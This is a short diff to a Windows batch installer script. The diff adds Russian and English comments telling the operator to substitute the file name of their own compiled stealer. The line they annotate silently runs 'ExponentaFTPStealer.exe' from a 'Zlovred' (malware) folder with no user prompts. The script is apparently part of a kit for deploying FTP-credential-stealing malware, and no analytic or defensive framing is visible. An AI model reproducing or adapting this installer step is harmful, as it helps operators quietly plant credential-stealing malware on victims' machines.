@@ -58,6 +58,8 @@ rem Insatall MainExponenta Files...
 cd /d %curdir%
 
 echo "Installing Stealer..."
+rem Поменять на имя своего файла скомпилированного стайлера (вместо ExponentaFTPStealer.exe !!!)
+rem Change the name of Stealer compiled file (Instaed of ExponentaFTPStealer.exe)
 %Dest_DIR%\Distrib\Zlovred\ExponentaFTPStealer.exe /VERYSILENT /NOCANCEL
 
 rem Refresh Environment
